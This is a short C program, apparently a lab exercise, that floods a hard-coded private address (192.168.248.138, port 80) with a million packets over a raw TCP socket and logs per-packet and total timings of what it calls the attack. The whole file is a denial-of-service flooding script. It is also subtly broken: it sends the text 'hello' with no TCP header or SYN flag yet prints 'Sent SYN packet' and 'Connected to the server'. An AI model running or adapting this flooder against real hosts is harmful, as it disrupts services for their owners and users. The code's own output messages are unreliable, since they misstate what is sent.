#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/types.h>
#include <time.h>

int main()
{

    int sock;
    struct sockaddr_in target;
    FILE *f = fopen("syns_results_c.txt", "a");
    int counter = 0;

    clock_t start, end;
    double cpu_time_used;

    clock_t start_attack, end_attack;
    double cpu_time_used_attack;


    // Create a raw socket

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    if (sock == -1) {
        perror("Failed to create socket");
        return 1;
    }


    // Set the target address and port

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr("192.168.248.138"); // IP address of the target
    target.sin_port = htons(80); // Port of the target
    // Send the SYN packet
    
  start_attack = clock();
  
  for(int i=0; i<100; i++) {
    
    for(int j=0; j<10000; j++) {

    counter++;
    start = clock();


    sendto(sock, "hello", 5, 0, (struct sockaddr *)&target, sizeof(target));
    
    printf("Sent SYN packet to %s:%d", inet_ntoa(target.sin_addr), ntohs(target.sin_port));

    printf("Connected to the server \n");
    end = clock();
    cpu_time_used = ((double) (end - start)) / CLOCKS_PER_SEC;

    fprintf(f, "Index of syn request %d\n", counter);
    fprintf(f, "Time to take %f Sec\n", cpu_time_used);

    }
   
  }
 
  close(sock);
  end_attack = clock();
  cpu_time_used_attack = ((double) (end_attack - start_attack)/ CLOCKS_PER_SEC) ;
    // Total time of the attack
  
  fprintf(f, "Total time of the attack %f Sec\n", cpu_time_used_attack);
  double avg = cpu_time_used_attack/counter;
  fprintf(f, "Average time per packet %f Sec\n", avg);
  fclose(f);
  

return 0;
}